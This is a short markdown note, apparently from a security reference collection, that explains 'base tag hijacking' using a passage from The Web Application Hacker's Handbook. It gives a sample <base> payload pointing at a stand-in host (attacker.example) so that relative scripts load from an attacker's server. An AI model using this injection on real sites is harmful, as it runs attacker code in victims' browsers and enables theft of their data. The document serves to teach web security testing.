# Base Tag Hijacking

## What it is

If you can introduce a new `<base>` tag and the page later loads relative script URLs, you may be able to make the browser resolve those scripts from a server you control while they still execute in the context of the vulnerable page.

## When it applies

Use this when direct code execution is not available but the page contains relative script includes after the injection point.

## Example

```html
<base href="https://attacker.example/badscripts/">
...
<script src="goodscript.js"></script>
```

The `<base>` tag is used to specify a URL that the browser should use to resolve any relative URLs that appear subsequently within the page. If you can introduce a new `<base>` tag, and the page performs any `<script>` includes after your reflection point using relative URLs, you can specify a base URL to a server that you control. When the browser loads the scripts specified in the remainder of the HTML page, they are loaded from the server you specified, yet they are still executed in the context of the page that has invoked them.

## Notes

According to specifications, `<base>` tags should appear within the `<head>` section of the HTML page. However, some browsers, including Firefox, accept `<base>` tags appearing anywhere in the page, considerably widening the scope of this attack.

## Source

Stuttard, Dafydd. *The Web Application Hacker's Handbook* (Kindle Locations 12281-12295). Wiley. Kindle Edition.
